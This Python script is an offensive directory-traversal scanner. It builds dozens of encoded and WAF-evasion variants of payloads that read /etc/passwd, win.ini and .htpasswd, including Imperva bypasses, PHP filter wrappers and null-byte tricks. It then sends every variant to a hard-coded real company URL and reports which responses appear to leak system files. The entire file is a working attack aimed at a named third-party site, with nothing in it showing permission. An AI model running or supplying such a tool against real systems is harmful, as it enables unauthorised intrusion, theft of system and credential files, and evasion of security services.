import requests
import urllib.parse
import base64
import random

# Target URL (modify this as needed)
TARGET_URL = "https://certinia.com/emea/"

# Base directory traversal payloads
basic_payloads = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    ".././.././.././.././etc/passwd"
]

# 20 Advanced Evasion Techniques 🚀
def advanced_red_team_variants(payload):
    """Generate multiple advanced encoded, obfuscated, and stealth variations of a payload."""
    variations = set()

    # 1️⃣ Basic URL Encodings
    variations.add(urllib.parse.quote(payload))
    variations.add(urllib.parse.quote_plus(payload))
    variations.add(urllib.parse.quote(payload, safe=''))

    # 2️⃣ Double, Triple & Recursive Encoding
    variations.add(urllib.parse.quote(urllib.parse.quote(payload)))
    variations.add(urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(payload))))
    variations.add(urllib.parse.quote_plus(urllib.parse.quote(payload)))

    # 3️⃣ Unicode Encoding Tricks
    variations.add(payload.replace("/", "%u2215").replace("\\", "%u2216"))
    variations.add(payload.replace("/", "%e2%81%84"))
    variations.add(payload.replace("/", "%ef%bc%8f"))
    variations.add(payload.replace("/", "%c0%af"))
    variations.add(payload.replace("/", "%e0%80%af"))

    # 4️⃣ Base64 Encoding
    variations.add(base64.b64encode(payload.encode()).decode())

    # 5️⃣ Hex Encoding
    hex_encoded = "".join("%{:02x}".format(ord(char)) for char in payload)
    variations.add(hex_encoded)

    # 6️⃣ Alternative Path Separators (Path Normalization Attacks)
    variations.update([
        payload.replace("/", "//"),
        payload.replace("/", "\\/"),
        payload.replace("/", ".\\"),
        payload.replace("/", "/////"),
        payload.replace("/", "%5C"),
        payload.replace("/", "%2F"),
        payload.replace("/", "/./"),
        payload.replace("/", "/././"),
    ])

    # 7️⃣ Apache HTTP Server Exploits
    apache_variants = [
        f"/.htaccess/{payload}",
        f"/cgi-bin/{payload}",
        f"/server-status/{payload}",
        f"/var/www/{payload}",
    ]
    variations.update(apache_variants)

    # 8️⃣ Imperva & CDN Bypass Payloads
    imperva_variants = [
        payload + "#",
        payload.replace("/", "/;/"),
        payload.replace("/", "/././"),
        payload.replace("/", "/%23/"),
        payload.replace("/", f"/{random.choice(['.', ';', ','])}/")
    ]
    variations.update(imperva_variants)

    # 9️⃣ Nuxt.js & Vue.js Traversal Techniques
    nuxt_variants = [
        f"/_nuxt/{payload}",
        f"/static/{payload}",
        f"/pages/{payload}",
        f"/layouts/{payload}",
    ]
    variations.update(nuxt_variants)

    # 🔟 HTTP/2 Exploits (Path Smuggling & Header Manipulation)
    http2_variants = [
        f"{payload}/%0D%0A%0D%0A",
        f"{payload}/%0d%0aTransfer-Encoding:%20chunked%0d%0a",
        f"/.{payload}",
    ]
    variations.update(http2_variants)

    # 11️⃣ Workable (Recruitment & ATS Bypass)
    workable_variants = [
        f"/careers/{payload}",
        f"/recruiting/{payload}",
        f"/job-applications/{payload}",
    ]
    variations.update(workable_variants)

    # 12️⃣ Self-Referencing Paths (Loopback Traversal)
    variations.add(payload.replace("/", "/%2e/"))  # `.` Directory Injection

    # 13️⃣ Symbolic Link Attacks (Bypassing Symlink Protection)
    variations.add(f"/tmp/symlink/{payload}")  # Symlink traversal attack

    # 14️⃣ Byte Flipping Encoding (Garbling WAFs)
    flipped_payload = "".join(["%%%02X" % (ord(c) ^ 0xFF) for c in payload])
    variations.add(flipped_payload)

    # 15️⃣ Wildcard Injection (Bypassing Directory Constraints)
    wildcard_variants = [
        payload.replace("/", "/*/"),
        payload.replace("/", "/%2A/"),
    ]
    variations.update(wildcard_variants)

    # 16️⃣ Encoding Chaos (Randomized Obfuscation)
    encoded_chaos = "".join([random.choice([urllib.parse.quote(c), c]) for c in payload])
    variations.add(encoded_chaos)

    # 17️⃣ Apache `.htpasswd` File Traversal (Common Exploit)
    variations.add(f"{payload}/../../../.htpasswd")

    # 18️⃣ JSON & GraphQL Path Traversal Attacks
    graphql_variants = [
        f"{{file: '{payload}'}}",
        f"{{file: \"{payload}\"}}"
    ]
    variations.update(graphql_variants)

    # 19️⃣ PHP Wrappers (PHP Filter Chains)
    php_variants = [
        f"php://filter/convert.base64-encode/resource={payload}",
        f"php://input/{payload}"
    ]
    variations.update(php_variants)

    # 20️⃣ Null Byte Injection (Tricking Input Validation)
    variations.add(payload + "%00")

    return list(variations)

def generate_advanced_variants(payloads):
    """Generate all encoded and obfuscated variants for a list of payloads."""
    all_payloads = set(payloads)
    for payload in payloads:
        all_payloads.update(advanced_red_team_variants(payload))
    return list(all_payloads)

# Function to test generated payloads
def test_traversal_payloads(url, payloads):
    for payload in payloads:
        full_url = url + payload
        try:
            response = requests.get(full_url, timeout=5)
            print(f"Testing: {full_url} - Status Code: {response.status_code}")
            #print(response.text)
            if "root" in response.text or "bash" in response.text:
                print(f"[*] Potential Vulnerability Found: {full_url}")
            if "Denied" in response.text or "Blocked" in response.text:
                print(f"[*] Blocked by security service: {full_url}")
        except requests.exceptions.RequestException as e:
            print(f"Error testing {full_url}: {e}")

if __name__ == "__main__":
    print("[*] Generating Ultimate Red-Team Payload Variations...")
    all_payloads = generate_advanced_variants(basic_payloads)

    print(f"[*] Total Payloads to Test: {len(all_payloads)}")
    test_traversal_payloads(TARGET_URL, all_payloads)